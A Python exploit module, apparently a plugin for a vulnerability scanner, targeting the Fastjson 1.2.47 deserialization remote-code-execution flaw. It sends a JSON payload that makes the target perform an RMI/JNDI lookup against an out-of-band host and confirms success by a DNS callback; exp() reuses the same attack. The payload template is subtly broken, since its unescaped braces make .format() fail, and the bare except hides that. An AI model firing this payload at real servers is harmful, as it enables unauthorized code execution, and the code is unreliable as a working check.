import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Fastjson 1.2.47 Deserialization RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce", 
            "https://www.freebuf.com/vuls/208339.html", 
            "https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955", 
            "https://github.com/wyzxxz/fastjson_rce_tool"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["fastjson", "rce", "deserialization", "oast"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/"""
        method = "POST"
        data = """{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://{oob_domain}/Exploit",
        "autoCommit":true
    }
}""".format(oob_domain=oob_domain)
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url